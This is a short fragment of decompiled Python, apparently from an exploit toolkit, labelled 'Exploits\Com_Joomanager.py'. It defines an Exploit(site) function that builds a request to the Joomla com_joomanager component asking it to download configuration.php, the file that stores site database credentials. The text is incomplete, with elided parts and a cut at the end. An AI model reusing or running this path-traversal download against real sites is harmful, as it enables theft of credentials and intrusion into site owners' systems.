...
# [GCC 9.3.0]
# Embedded file name: Exploits\Com_Joomanager.py
import requests
import re
...
def Exploit(site):
    try:
        Exp = 'http://' + site + '/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php'
